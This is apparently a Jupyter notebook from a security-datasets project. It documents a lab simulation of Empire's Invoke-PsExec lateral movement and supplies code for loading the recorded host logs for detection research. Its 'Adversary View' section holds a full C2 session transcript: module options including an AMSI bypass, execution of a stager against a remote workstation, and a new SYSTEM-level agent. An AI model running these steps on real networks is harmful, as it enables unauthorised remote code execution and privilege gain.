{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "36d2df0f",
   "metadata": {},
   "source": [
    "# Empire Invoke PsExec"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "904998a3",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6ef8751b",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/05/18 |\n",
    "| Modification Date | 2020/09/20 |\n",
    "| Tactics           | [TA0002](https://attack.mitre.org/tactics/TA0002),[TA0008](https://attack.mitre.org/tactics/TA0008) |\n",
    "| Techniques        | [T1021](https://attack.mitre.org/techniques/T1021) |\n",
    "| Tags              | RPC CreateService,RPC StartService,TCP Svcctl |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "eee13583",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries remotely creating and starting a service via RPC methods over TCP."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8565aa33",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9a9ce6c1",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_psexec_dcerpc_tcp_svcctl.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_psexec_dcerpc_tcp_svcctl.zip) |\n",
    "| Network | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/empire_psexec_dcerpc_tcp_svcctl.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/network/empire_psexec_dcerpc_tcp_svcctl.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3d5fccfe",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c92b6800",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9346bf3d",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [lateral_movement](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-PsExec.ps1) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ea41a644",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: stager/multi/launcher) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "A7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \n",
    "HBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \n",
    "UF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 16:13:06  http            \n",
    "\n",
    "\n",
    "(Empire: agents) > interact UF5MYK42\n",
    "(Empire: UF5MYK42) > usemodule lateral_movement/invoke_psexec\n",
    "(Empire: powershell/lateral_movement/invoke_psexec) > set Listener http\n",
    "(Empire: powershell/lateral_movement/invoke_psexec) > execute\n",
    "(Empire: powershell/lateral_movement/invoke_psexec) > set ComputerName WORKSTATION6.theshire.local\n",
    "(Empire: powershell/lateral_movement/invoke_psexec) > info\n",
    "\n",
    "              Name: Invoke-PsExec\n",
    "            Module: powershell/lateral_movement/invoke_psexec\n",
    "        NeedsAdmin: False\n",
    "        OpsecSafe: False\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: True\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @harmj0y\n",
    "\n",
    "Description:\n",
    "  Executes a stager on remote hosts using PsExec type\n",
    "  functionality.\n",
    "\n",
    "Comments:\n",
    "  https://github.com/rapid7/metasploit-\n",
    "  framework/blob/master/tools/psexec.rb\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name             Required    Value                     Description\n",
    "  ----             --------    -------                   -----------\n",
    "  Agent            True        UF5MYK42                  Agent to run module on.                 \n",
    "  Listener         False                                 Listener to use.                        \n",
    "  Obfuscate        False       False                     Switch. Obfuscate the launcher          \n",
    "                                                        powershell code, uses the               \n",
    "                                                        ObfuscateCommand for obfuscation types. \n",
    "                                                        For powershell only.                    \n",
    "  ObfuscateCommand False       Token\\All\\1               The Invoke-Obfuscation command to use.  \n",
    "                                                        Only used if Obfuscate switch is True.  \n",
    "                                                        For powershell only.                    \n",
    "  AMSIBypass       False       True                      Include mattifestation's AMSI Bypass in \n",
    "                                                        the stager code.                        \n",
    "  AMSIBypass2      False       False                     Include Tal Liberman's AMSI Bypass in   \n",
    "                                                        the stager code.                        \n",
    "  ComputerName     True        ComputerName WORKSTATION6.theshire.local Host to execute the stager on.          \n",
    "  ServiceName      True        Updater                   The name of the service to create.      \n",
    "  Command          False                                 Custom command to execute on remote     \n",
    "                                                        hosts.                                  \n",
    "  ResultFile       False                                 Name of the file to write the results to\n",
    "                                                        on agent machine.                       \n",
    "  UserAgent        False       default                   User-agent string to use for the staging\n",
    "                                                        request (default, none, or other).      \n",
    "  Proxy            False       default                   Proxy to use for request (default, none,\n",
    "                                                        or other).                              \n",
    "  ProxyCreds       False       default                   Proxy credentials                       \n",
    "                                                        ([domain\\]username:password) to use for \n",
    "                                                        request (default, none, or other).      \n",
    "\n",
    "(Empire: powershell/lateral_movement/invoke_psexec) > execute\n",
    "[>] Module is not opsec safe, run? [y/N] y\n",
    "[*] Tasked UF5MYK42 to run TASK_CMD_JOB\n",
    "[*] Agent UF5MYK42 tasked with task ID 1\n",
    "[*] Tasked agent UF5MYK42 to run module powershell/lateral_movement/invoke_psexec\n",
    "(Empire: powershell/lateral_movement/invoke_psexec) > \n",
    "Job started: RNU5DY\n",
    "\n",
    "[*] Sending POWERSHELL stager (stage 1) to 172.18.39.6\n",
    "\n",
    "[*] New agent 9CMNYX72 checked in\n",
    "[+] Initial agent 9CMNYX72 from 172.18.39.6 now active (Slack)\n",
    "[*] Sending agent (stage 2) to 9CMNYX72 at 172.18.39.6\n",
    "\n",
    "(Empire: powershell/lateral_movement/invoke_psexec) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "A7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \n",
    "HBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \n",
    "UF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 16:17:06  http            \n",
    "\n",
    "9CMNYX72 ps 172.18.39.6     WORKSTATION6      *THESHIRE\\SYSTEM        powershell         4312   5/0.0    2020-09-20 16:17:08  http            \n",
    "\n",
    "(Empire: agents) > interact 9CMNYX72\n",
    "(Empire: 9CMNYX72) > shell whoami\n",
    "[*] Tasked 9CMNYX72 to run TASK_SHELL\n",
    "[*] Agent 9CMNYX72 tasked with task ID 1\n",
    "(Empire: 9CMNYX72) > \n",
    "nt authority\\system\n",
    "\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: 9CMNYX72) > back\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bb985e77",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c22e4180",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6b4700f6",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_psexec_dcerpc_tcp_svcctl.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "59dee703",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "70d62115",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "183e7093",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "30e340b4",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ab2cdde2",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/](https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/) \n",
    "* [https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick#psinjectps1](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick#psinjectps1) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
